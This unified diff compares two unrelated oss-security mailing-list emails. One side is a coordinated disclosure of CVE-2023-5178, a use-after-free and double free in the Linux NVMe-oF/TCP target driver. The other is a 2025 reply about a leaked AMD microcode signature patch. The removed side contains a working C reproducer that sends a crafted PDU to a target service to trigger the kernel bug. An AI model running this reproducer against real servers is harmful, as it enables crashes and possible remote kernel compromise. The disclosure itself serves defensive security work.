@@ -1,4 +1,4 @@
-Received: (qmail 16348 invoked by uid 550); 15 Oct 2023 15:47:21 -0000
+Received: (qmail 1757 invoked by uid 550); 22 Jan 2025 15:04:18 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,294 +7,118 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 14250 invoked from network); 15 Oct 2023 15:43:03 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20230601; t=1697384572; x=1697989372; darn=lists.openwall.com;
-        h=content-transfer-encoding:to:subject:message-id:date:from
-         :mime-version:from:to:cc:subject:date:message-id:reply-to;
-        bh=CBztTFfFYg5tI3pT4YD4ywX9n6Wd0rjYhdg5Hmpbp6w=;
-        b=eM672TuUaPAWH2f8Ag3mhjKsiuNAz84U5jBM2hKA6M6FfCVRwXTlQMqyz2UzWONrnV
-         dJQiO/e0nKqu6WLc8u+6544lsNt9BUpfTfiJMNG+XlW5N77TPbdGXtqrh7QBPQj444Iq
-         LRBMkyxQKGoOlU8bC3DBR+0+bVns9FS+r8fmmPuM4j4+PhPuy6EJMqcFpem3urLoOKYm
-         4soShQo3ot6SFhIJNx7eqyYD7DFMIm4/7dQNyOW/zwUBJ6RFshvbPFwsg3AZAqXb7iUs
-         TTqgc66UMoJlaRgEvM90MWf0j7nHCFnvJnam2YZBuqBRDnK/XXFIAvu25zpN1B4IBv86
-         P73Q==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1697384572; x=1697989372;
-        h=content-transfer-encoding:to:subject:message-id:date:from
-         :mime-version:x-gm-message-state:from:to:cc:subject:date:message-id
-         :reply-to;
-        bh=CBztTFfFYg5tI3pT4YD4ywX9n6Wd0rjYhdg5Hmpbp6w=;
-        b=oxJvOj+rE2n0PPKHkYAqeq+ELimGAsgndGjZ3yTo0x2+cDEpf+mQCBACqRvvQekHq9
-         RMsnAzUfnAi0Ur14Ptt48XoHZ8aWTIk1ESfX/yIzx7JaHFMY7vOCsRvSO6cxAHhQZcpw
-         xDThB6+Q5EzbdySB5Ol5Qk2P1gz492sUe2BFNrgAd/hUDXs7uXR4NusvGsslVW6XNDRy
-         2xuR7WTBQ0S4NFNE4VJaW0CYmPGZH8+AeJWph82I5OKKBfFOVXpYSlyj9yHJ7WAH0RSP
-         jKmuHCdlShty13Q19yYum9o+G0qLBk5MbT11IQ1kJWnO1VAkijw2FmVdx8nosNztUCzK
-         ixOQ==
-X-Gm-Message-State: AOJu0YzPQaYT2ISA4hEceyjJh2Qaa4fe5UQoB0sVqbmZSb9Q98W6A4vN
-	BE3PF0NsN7WoaiTIVGy+FDPRoKsPD3bwR/jRQ71vg+rqhQjzOA==
-X-Google-Smtp-Source: AGHT+IHI7jkbkHGsZTw6ALlZhLyaYUwBoaZBAMTtDB8aX4ZbnuAJa2aVEfQZv6YBmihqkQnJrUN7UEu/PPl47Jhga0U=
-X-Received: by 2002:a17:907:7f0a:b0:9b8:df8e:cbd0 with SMTP id
- qf10-20020a1709077f0a00b009b8df8ecbd0mr4472963ejc.37.1697384571867; Sun, 15
- Oct 2023 08:42:51 -0700 (PDT)
-MIME-Version: 1.0
-From: Alon Zahavi <zahavi.alon@gmail.com>
-Date: Sun, 15 Oct 2023 18:42:40 +0300
-Message-ID: <CAK5usQs507yNj3CgrjZWF5kVcELZ+tOXaxK0Q0esrskVat0LZw@mail.gmail.com>
+x-ms-reactions: disallow
+Received: (qmail 24094 invoked from network); 22 Jan 2025 04:38:30 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
+	invisiblethingslab.com; h=cc:content-type:content-type:date:date
+	:from:from:in-reply-to:in-reply-to:message-id:mime-version
+	:references:reply-to:subject:subject:to:to; s=fm2; t=1737520703;
+	 x=1737607103; bh=RMQ42wCU1FSwHRdFF0bL0zxk0iSMFTiWZqgheMMFFCQ=; b=
+	H7nvqichh632mSjS6iddNd6gIRGdohsBYDiS2Om7DXSBynHXdg3YHUtZsT3kBVRA
+	E0Ivy2tdyKFz/e6W0d/CST3XOmRsiVteqv6plYBVfnf46T73YvK4cVeIGzclPhAt
+	QFmQbkIybYx1/Ou8A6ABp9utJmsq8yL+y0aI7neCf075RBSunpSfiPplS9OtT7N3
+	/Doje8P3uNjz1RPFYdRJxmSHwvKfeUY7y9/TRd8Mnb+4zZNFrRzuv8cv/kTZjiUW
+	l8IbnaZ7Nk9FPiC92Lpnwi08hFXh2Pk8dxu4dazH4iwwVf4oUyMDd8LWDdEa6S7l
+	AEQlHcFx4Eo+WONPONaodQ==
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
+	messagingengine.com; h=cc:content-type:content-type:date:date
+	:feedback-id:feedback-id:from:from:in-reply-to:in-reply-to
+	:message-id:mime-version:references:reply-to:subject:subject:to
+	:to:x-me-proxy:x-me-sender:x-me-sender:x-sasl-enc; s=fm3; t=
+	1737520703; x=1737607103; bh=RMQ42wCU1FSwHRdFF0bL0zxk0iSMFTiWZqg
+	heMMFFCQ=; b=Nl1AiuuXNFj6cysSy5KUHGIQyEnOxPVk704HrhTfPSLmgs66RdC
+	gaD8YDNAY6hSJlQcbRKgw8gILqseGZTsugBa+oPXz3MP14208Vnj8tS5zInlVuZR
+	Y+OufKpLrO2uoBXjQzML0CLb+8p2ly2B0OkN17RfMf2KUqB+BuAJbz5yOY7iPbGJ
+	ucqUpL8cFbINuZQNsWH6VqnuboYvF/I+NpaVyD/uOjgrf1ioueeoU0fQ6Y15aARO
+	u8beDTAC9blCORP0PzCHUyafaN9r/qpx7sGNki8LZP9JQsHMKFWzP9pTdp4BpOu5
+	1l9XsPIsT6XM6Ozc8yxVVWK3WCkTK0CSjGg==
+X-ME-Sender: <xms:PnaQZ0xAp1QQGSoOh4lMEfl-WcBMz7C-DRYwcF3cQhBFenkFjqh5ng>
+    <xme:PnaQZ4TEAMWLSct38ddhaDxAuwqWOMAO734jDY3BOQObPFpJppqAzmh_wGfyguK2O
+    MlJeo4Nr_0pXcs>
+X-ME-Received: <xmr:PnaQZ2Wc8ioi7H_rHqK-xuOXsm-JNdlGZt6ps7ocK0cFth5XkdrM8-mi8w>
+X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgeefuddrudejfedgjedvucetufdoteggodetrfdotf
+    fvucfrrhhofhhilhgvmecuhfgrshhtofgrihhlpdggtfgfnhhsuhgsshgtrhhisggvpdfu
+    rfetoffkrfgpnffqhgenuceurghilhhouhhtmecufedttdenucenucfjughrpeffhffvuf
+    fkfhggtggujgesghdtreertddtvdenucfhrhhomhepffgvmhhiucforghrihgvucfqsggv
+    nhhouhhruceouggvmhhisehinhhvihhsihgslhgvthhhihhnghhslhgrsgdrtghomheqne
+    cuggftrfgrthhtvghrnhepvdffheefvdetuddtffffudekieejveevteeggffgffejveff
+    veejfffgieegueeunecuffhomhgrihhnpegrshhushdrtghomhdplhgvvhgvlhduthgvtg
+    hhshdrtghomhenucevlhhushhtvghrufhiiigvpedtnecurfgrrhgrmhepmhgrihhlfhhr
+    ohhmpeguvghmihesihhnvhhishhisghlvghthhhinhhgshhlrggsrdgtohhmpdhnsggprh
+    gtphhtthhopedupdhmohguvgepshhmthhpohhuthdprhgtphhtthhopehoshhsqdhsvggt
+    uhhrihhthieslhhishhtshdrohhpvghnfigrlhhlrdgtohhm
+X-ME-Proxy: <xmx:PnaQZyjBzkkmi6ZOier0heJW4ynxx_6LFeV9i1QUIRrPomusz_zImg>
+    <xmx:PnaQZ2DytStWxuozgD2v8TChonlLXrjVXp4QAUra-L107A5TiZKFng>
+    <xmx:PnaQZzIPoUXfl46kenz1I-wPiCIJyXewim66f-7p-T6PBQNyheMQTQ>
+    <xmx:PnaQZ9D17ykdaGmJqyR3iy8WKWQbe1mwaEXB2WoRm8wIns-fyRQtSA>
+    <xmx:P3aQZ37JvcvD8kzUlC8rN5L9ia_e2ZRMcBU-4OitdYIrOyR_XXPD85Gm>
+Feedback-ID: iac594737:Fastmail
+Date: Tue, 21 Jan 2025 23:38:16 -0500
+From: Demi Marie Obenour <demi@invisiblethingslab.com>
 To: oss-security@lists.openwall.com
-Content-Type: text/plain; charset="UTF-8"
+Message-ID: <Z5B2PA7DHTBbvbOq@itl-email>
+References: <Z5BYg9WPFBF7JBEB@thinkstation.cmpxchg8b.net>
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha256;
+	protocol="application/pgp-signature"; boundary="GCv24PqyPJcIKQXn"
+Content-Disposition: inline
+In-Reply-To: <Z5BYg9WPFBF7JBEB@thinkstation.cmpxchg8b.net>
+Subject: Re: [oss-security] AMD Microcode Signature Verification Vulnerability
+
+--GCv24PqyPJcIKQXn
+Content-Type: text/plain; protected-headers=v1; charset=us-ascii
+Content-Disposition: inline
 Content-Transfer-Encoding: quoted-printable
-Subject: [oss-security] CVE-2023-5178: Linux NVMe-oF/TCP Driver - UAF in `nvmet_tcp_free_crypto`
-
-After disclosing the issue with the linux-distros mailing list and the
-maintainers of the NVMe-oF/TCP subsystem, I am reporting the security
-issue publicly here.
-The patch is at work and will be available soon.
-You may follow the patch here:
-https://lore.kernel.org/all/20231004173226.5992-1-sj@kernel.org/T/
-
-This vulnerability was assigned with CVE-2023-5178.
-
-## Bug Summary:
-
-Due to a logical bug in the NVMe-oF/TCP subsystem in the Linux kernel,
-a malicious actor, with the ability to send messages to the
-NVMe-oF/TCP server (either LAN or WAN), can cause a UAF and a double
-free, which may lead to remote kernel code execution.
-
-## Bug Location
-
-`drivers/nvme/target/tcp.c` in the function `nvmet_tcp_free_crypto`
-
-From the introduction of NVMe-oF/TCP and up until the fix that would come.
-
-## Technical Details
-
-### In a few words:
-
-The function `nvmet_tcp_free_crypto` is called twice, thus freeing
-some pointers twice. Also, it dereferencing a freed address.
-
-```
-
-static void nvmet_tcp_free_crypto(struct nvmet_tcp_queue *queue)
-
-{
-
-        struct crypto_ahash *tfm =3D crypto_ahash_reqtfm(queue->rcv_hash);
-
-
-        ahash_request_free(queue->rcv_hash);
-        ahash_request_free(queue->snd_hash);
-        crypto_free_ahash(tfm);
-
-}
-
-```
-
-
-### In More Details:
-
-****** First Free ******
-
-The NVMe/TCP subsystem uses a queue (`nvmet_tcp_queue`), in which it
-has two `struct ahash_request` fields (`rcv_hash` and `snd_hash`).
-
-Following is the `nvmet_tcp_handle_icreq()` function.
-
-
-```
-
-static int nvmet_tcp_handle_icreq(struct nvmet_tcp_queue *queue)
-
-{
-
-...
-
-        if (le32_to_cpu(icreq->hdr.plen) !=3D sizeof(struct nvme_tcp_icreq_=
-pdu)) {
-
-                pr_err("bad nvme-tcp pdu length (%d)\n",
-                           le32_to_cpu(icreq->hdr.plen));
-
-                nvmet_tcp_fatal_error(queue); // [1]
-
-        }
-
-...
-
-        if (queue->hdr_digest || queue->data_digest) {
-
-                ret =3D nvmet_tcp_alloc_crypto(queue); // [2]
-
-                if (ret)
-
-                        return ret;
-
-       }
-
-...
-
-        ret =3D kernel_sendmsg(queue->sock, &msg, &iov, 1, iov.iov_len); //=
- [3]
-
-        if (ret < 0)
-
-                 goto free_crypto; // [4]
-
-...
-
-free_crypto:
-
-        if (queue->hdr_digest || queue->data_digest)
-
-        nvmet_tcp_free_crypto(queue); // [5]
-
-        return ret;
-
-}
-
-```
-
-
-[1] - In case the condition isn=E2=80=99t met, there is a call to
-`nvmet_tcp_fatal_error`, which in there a `kernel_sock_shutdown`
-operation is being called, to shut down the socket inside the NVMe
-queue.
-
-[2] - Afterwards, we allocate the crypto fields of the queue
-(`snd_hash` and `rcv_hash`).
-
-[3] - We try to send a message with the shut-downed socket, and when
-it fails we go to `free_crypto` label ([4]).
-
-[5] - We call `nvmet_tcp_free_crypto` for the first time.
-
-
-****** Second Free ******
-
-When the TCP session ends, the function `nvmet_tcp_release_queue_work`
-is called by the subsystem.
-
-
-```
-
-static void nvmet_tcp_release_queue_work(struct work_struct *w)
-
-{
-
-...
-
-        if (queue->hdr_digest || queue->data_digest)
-
-        nvmet_tcp_free_crypto(queue);
-
-...
-
-}
-
-```
-
-
-In that function, we call `nvmet_tcp_free_crypto` with the same queue
-from before thus triggering the bug.
-
-Looking back on the `nvmet_tcp_free_crypto` function we can see the followi=
-ng:
-
-
-1. `struct crypto_ahash *tfm =3D crypto_ahash_reqtfm(queue->rcv_hash);`
-- The second call to the crypto free function will cause a
-dereferencing of a pointer from a freed object (UAF). That `tfm`
-variable will later use its `tfm->exit()` function pointer, thus
-leading to code execution.
-
-2. `ahash_request_free(queue->rcv_hash);` - A double free of a
-`kmalloc-96` object, leading to memory corruption with undefined
-behaviour. Also, it may lead to kernel code execution with the proper
-exploitation
-
-3. `ahash_request_free(queue->snd_hash);` - Same as the second bullet above.
-
-4. `crypto_free_ahash(tfm);` - Here `tfm->exit()` is called.
-
-
-## Reproducing
-
-### Environment:
-Any Linux machine with NVMe-oF/TCP enabled (Linux version 5.15 and above).
-
-here is how to configure NVMe-of/TCP on the machine -
-https://www.linuxjournal.com/content/data-flash-part-iii-nvme-over-fabrics-=
-using-tcp
-
-
-### Execution:
-I am adding a reproducer generated by Syzkaller with some
-optimizations and minor changes.
-
-
-```
-#define _GNU_SOURCE
-
-#include <stdio.h>
-#include <stdint.h>
-#include <string.h>
-#include <sys/syscall.h>
-#include <sys/types.h>
-#include <unistd.h>
-
-uint64_t r[1] =3D {0xffffffffffffffff};
-
-void loop(void)
-{
-intptr_t res =3D 0;
-  res =3D syscall(__NR_socket, /*domain=3D*/2ul, /*type=3D*/1ul, /*proto=3D=
-*/0);
-  if (res !=3D -1)
-    r[0] =3D res;
-  *(uint16_t*)0x20000100 =3D 2;
-  *(uint16_t*)0x20000102 =3D htobe16(0x1144); // Service port
-  *(uint32_t*)0x20000104 =3D htobe32(0xc0a8eb8b); // Service IP
-  syscall(__NR_connect, /*fd=3D*/r[0], /*addr=3D*/0x20000100ul, /*addrlen=
-=3D*/0x10ul);
-  memcpy((void*)0x20000240,
-         "\x00\x08\x80\x5d\xe3\x00\x00\x00\x00\x00\x00\x02\x04\x09\x00\x00\=
-x6f"
-         "\x30\x0d\x02\xef\x84\x31\x0f\xc3\xab\xf2\xd4\x12\x9f\xab\x6a\x3c\=
-x50"
-         "\x84\x95\x9b\x43\x4e\x06\x22\xf9\x00\x8a\xd0\x8e\x92\x95\x5b\x99\=
-x18"
-         "\x28\xfb\xa9\x14\x12\x2d\xcb\x00\x65\x2b\x3f\x12\xf8\xf8\xd6\x0a\=
-x80"
-         "\x0d\x10\x36\xc1\x1a\x39\x46\x00\x00\x00\x00\x00\x00\x00\xed\x07\=
-x1d"
-         "\x37\xe4\xd0\xdf\x0d\x31\x2f\xfd\xaa\x1f\xbe\xe4\x8f\x72\x3d\xc5\=
-x1b"
-         "\x5a\x52\x07\x64\xcc\xbb\x0e\x65\xa7\xc1\x01\xbd\xed\x7e\xe2\x0b\=
-xdc"
-         "\x53\x13\xbd\xa7\xea\xea\x5f\xcc\xa1\x6e\x2e\xa4\x85\x99\x8b\x04\=
-x21"
-         "\x3e\x4c\x00\x00\x00\x00\x00\x00",
-         144);
-  syscall(__NR_sendto, /*fd=3D*/r[0], /*pdu=3D*/0x20000240ul, /*len=3D*/0x8=
-0ul,
-          /*f=3D*/0ul, /*addr=3D*/0ul, /*addrlen=3D*/0ul);
-}
-
-int main(void)
-{
-  syscall(__NR_mmap, /*addr=3D*/0x1ffff000ul, /*len=3D*/0x1000ul, /*prot=3D=
-*/0ul,
-          /*flags=3D*/0x32ul, /*fd=3D*/-1, /*offset=3D*/0ul);
-  syscall(__NR_mmap, /*addr=3D*/0x20000000ul, /*len=3D*/0x1000000ul, /*prot=
-=3D*/7ul,
-          /*flags=3D*/0x32ul, /*fd=3D*/-1, /*offset=3D*/0ul);
-  syscall(__NR_mmap, /*addr=3D*/0x21000000ul, /*len=3D*/0x1000ul, /*prot=3D=
-*/0ul,
-          /*flags=3D*/0x32ul, /*fd=3D*/-1, /*offset=3D*/0ul);
-  loop();
-  return 0;
-}
-
-```
+Date: Tue, 21 Jan 2025 23:38:16 -0500
+From: Demi Marie Obenour <demi@invisiblethingslab.com>
+To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] AMD Microcode Signature Verification Vulnerability
+
+On Tue, Jan 21, 2025 at 06:31:31PM -0800, Tavis Ormandy wrote:
+> It looks like an OEM leaked the patch for a major upcoming CPU
+> vulnerability, i.e. "AMD Microcode Signature Verification
+> Vulnerability":
+>=20
+> https://rog.asus.com/motherboards/rog-strix/rog-strix-x870-i-gaming-wifi/=
+helpdesk_bios/
+>=20
+> I'm not thrilled about this - the patch is *not* currently in
+> linux-firmware, so this is the only publicly available patch.
+>=20
+> However, other people are discussing how to extract them:
+>=20
+> https://winraid.level1techs.com/t/offer-intel-amd-via-cpu-microcode-archi=
+ves-1995-present/102857/53
+
+Is this fix effective, or can it be bypassed via a downgrade attack?
+
+Since microcode loading can (hopefully!) only be done in ring 0 and SVM
+root mode, this means that one needs OS kernel access to perform an
+exploit.  However, if an attacker could load arbitrary microcode, they
+could compromise SMM, SEV-SNP, and DRTM, so this is still pretty bad.
+--=20
+Sincerely,
+Demi Marie Obenour (she/her/hers)
+Invisible Things Lab
+
+--GCv24PqyPJcIKQXn
+Content-Type: application/pgp-signature; name="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCAAdFiEEopQtqVJW1aeuo9/sszaHOrMp8lMFAmeQdjkACgkQszaHOrMp
+8lNQVw/+I4Pwff9bkK1QWjrRI10y8j/peXmhJq28r+5+aDMIPKTt31nALU3FH/VD
+qnC8m4B9A2qdFiTiks0m5bY8yByxji9z3gpHdAkTjrHhWA4NaZQgR8Uu8lXYqg5d
+HyiMgdQQ3ZK1qUeYnJ6imkHnelerOz3OI3LrWpDBDd5aHAzS48amY4SUtE21Pm12
+bITU+PuuC9+hf/oRR5dUrq+Dt3an3oygh+EeIqUPhVKr7NFxITwtfJnZqE71HJbd
++UQ6AuheXkqtWLndFXoK41irgc3gnFPR8a/7skFcH4seGJbRfvtJ+3696ziMiADf
+C8KxWJBwDV43bHzQT5xjmc/HMCSlAzCvPJJYYuj3AAhJJ+9L5jviKnNF5caws30g
++rQY4cY2HB7L+33jRrs4oPOoEafPqbel0XditNzsKsSRsPQVMJNGnPsO2aRp3Ncy
+RU5dC4ArtAKdhPK4wXxpa426Sa49+MAK+XfEivvDLvNdmgnxtUWd2vvnGj1chr4r
+d1rDVxsxCn/NAdvQFb3f/REMMbQ8udIhpHKZJGgOtU3F97xx206AjT3xHs0b1CK5
+uC06b7DnMGjkA2yCKXVih2yyMNcJl3dtJaR42UtAbCVUmCVNgnsMNLUYw1X/iQ9o
+/uKb3egtIV442WYEpLQt96fqeIZ+VZzVA7TZqCDQ59lQrpffBvQ=
+=LmdQ
+-----END PGP SIGNATURE-----
+
+--GCv24PqyPJcIKQXn--
